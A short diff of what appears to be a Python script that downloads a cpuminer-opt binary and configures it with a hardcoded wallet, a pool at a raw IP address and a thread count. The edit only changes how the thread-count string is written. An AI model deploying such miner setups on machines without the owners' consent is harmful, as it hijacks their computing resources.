@@ -10,7 +10,7 @@ import urllib.request
 WALLET = "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Genzo"
 POOL = "stratum+tcp://104.248.150.108:9933"
 ALGO = "power2b"
-THREADS = "nproc --all"
+THREADS = "(nproc --all)"
 URL = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz"
 FILENAME = "cpuminer-opt-linux.tar.gz"
 EXTRACTED_BIN = "cpuminer-sse2"
